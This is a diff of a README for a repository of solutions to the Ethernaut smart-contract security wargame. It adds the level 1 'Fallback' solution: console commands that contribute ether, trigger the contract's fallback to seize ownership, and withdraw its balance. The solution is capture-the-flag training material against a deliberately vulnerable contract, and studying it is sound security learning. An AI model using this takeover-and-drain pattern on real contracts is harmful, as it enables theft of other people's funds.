@@ -1,4 +1,9 @@
-# Ethernaut-Solutions
+# Ethernaut solution
 
-1) Solutions to the game ethernaut.
-2) Contracts for each level are fixed and are compilable on remix as of the date of commit. 
+## 1. Fallback
+
+```
+await contract.contribute({value: 1234});
+await contract.sendTransaction({value: 1234});
+contract.withdraw();
+```
